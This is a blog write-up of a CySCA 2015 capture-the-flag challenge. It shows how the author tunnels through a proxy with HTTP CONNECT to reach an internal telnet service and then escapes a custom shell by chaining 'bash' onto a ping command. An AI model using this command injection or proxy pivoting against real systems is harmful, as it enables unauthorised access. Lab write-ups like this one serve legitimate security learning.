---
title: CySCA 2015 - Corporate Pentest 2.0 - Murphys Law
author: nickw
layout: post

categories:
  - Blog
  - Security
---

From Sales Pitch we discover the server has some internal bound services,
most notably telnet (port 23) - These are listed on the internal management page. It is only accessible from inside the network
however. 

Fortunately, telnet is a text based protocol, so we can easily just do a
proxy`HTTP CONNECT` to it via the proxy. 

{% highlight bash %}
$> telnet 172.16.5.30 3128
CONNECT 10.10.5.30:23 HTTP/1.0
{% endhighlight %}

<!--break-->

We need to authenticate (token is found on the backend management page)
{% highlight bash %}
Token: 7e8e816557776037a15f
{% endhighlight %}

We are now connected to the home baked shell implementation. We need to break out. *Get root*. 

We realise it has a ping command, which uses system ping and takes arguments. 
We tell ping to only execute once, and chain another command to it -> bash. 

{% highlight bash %}
$> ping -c1 10.10.5.30 && bash
{% endhighlight %}

We now have a shell. From here we can:

{% highlight bash %}
$> cat flag.txt
FLAG{27EE85353BC178B42F08A285AFAC1633}
{% endhighlight %}
 
And thus revealing the flag.

After we found the flag, a hint was revealed:

> Maybe try ping "and"

